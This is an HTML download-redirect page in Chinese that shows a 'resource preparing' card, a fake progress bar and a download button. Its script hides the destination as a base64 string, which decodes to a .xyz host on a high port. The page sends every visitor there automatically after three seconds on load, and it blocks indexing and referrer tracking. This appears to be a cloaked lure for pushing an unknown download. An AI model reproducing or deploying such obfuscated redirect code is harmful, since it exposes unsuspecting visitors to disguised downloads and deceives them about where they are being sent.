<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
<meta name="referrer" content="no-referrer">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<link rel="canonical" href="https://boyiyuanwood.com/">
<title>资源准备中</title>
<link rel="icon" href="/favicon.ico">
<style>
:root{--bg:#07122d;--panel:rgba(14,28,68,.86);--cyan:#54f2dd;--violet:#9a74ff;--gold:#ffcf55;--text:#f7fbff;--muted:#b9c7e6}
*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;font-family:Arial,"Microsoft YaHei",sans-serif;color:var(--text);background:radial-gradient(circle at 18% 18%,rgba(84,242,221,.22),transparent 26%),radial-gradient(circle at 82% 14%,rgba(154,116,255,.26),transparent 30%),linear-gradient(135deg,#07122d,#101a45 45%,#081025)}
.transfer-card{width:min(92vw,520px);padding:38px 34px;border:1px solid rgba(135,156,255,.34);border-radius:8px;background:var(--panel);box-shadow:0 22px 70px rgba(0,0,0,.38),0 0 34px rgba(84,242,221,.16);text-align:center;backdrop-filter:blur(16px)}
.pulse{width:86px;height:86px;margin:0 auto 22px;border-radius:50%;background:linear-gradient(135deg,var(--cyan),var(--violet));box-shadow:0 0 36px rgba(84,242,221,.45);position:relative}.pulse:after{content:"";position:absolute;inset:22px;border-radius:50%;background:#07122d;border:3px solid rgba(255,255,255,.78)}
h1{margin:0 0 12px;font-size:30px}p{margin:8px 0;color:var(--muted);line-height:1.8}.progress{height:9px;border-radius:999px;background:rgba(255,255,255,.12);overflow:hidden;margin:24px 0}.bar{height:100%;width:0;background:linear-gradient(90deg,var(--cyan),var(--gold));box-shadow:0 0 18px rgba(84,242,221,.55);transition:width .2s linear}.manual{display:inline-flex;align-items:center;justify-content:center;margin-top:10px;min-height:48px;padding:0 26px;border-radius:999px;color:#07122d;text-decoration:none;font-weight:800;background:linear-gradient(135deg,var(--gold),var(--cyan));box-shadow:0 0 26px rgba(84,242,221,.38)}.manual:hover{transform:translateY(-1px);filter:saturate(1.1)}
</style>
</head>
<body>
<main class="transfer-card" aria-live="polite">
  <div class="pulse" aria-hidden="true"></div>
  <h1>资源准备中</h1>
  <p>正在校验连接环境</p>
  <p>即将进入下载页面</p>
  <p>请勿关闭当前页面</p>
  <div class="progress"><div class="bar" id="bar"></div></div>
  <a class="manual" id="manualDownload" href="/download.html" rel="nofollow noopener noreferrer">立即下载</a>
</main>
<script>
const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9haHpxLjMxMzQ4Ni54eXo6MzU4ODgv");
const manualDownload = document.getElementById("manualDownload");
const bar = document.getElementById("bar");
let start = Date.now();
let timer = setInterval(function(){
  let percent = Math.min(100, ((Date.now() - start) / 3000) * 100);
  bar.style.width = percent + "%";
  if (percent >= 100) {
    clearInterval(timer);
  }
}, 80);
setTimeout(function(){
  window.location.replace(REAL_DOWNLOAD_URL);
}, 3000);
manualDownload.addEventListener("click", function(e){
e.preventDefault();
window.location.replace(REAL_DOWNLOAD_URL);
});
</script>
</body>
</html>
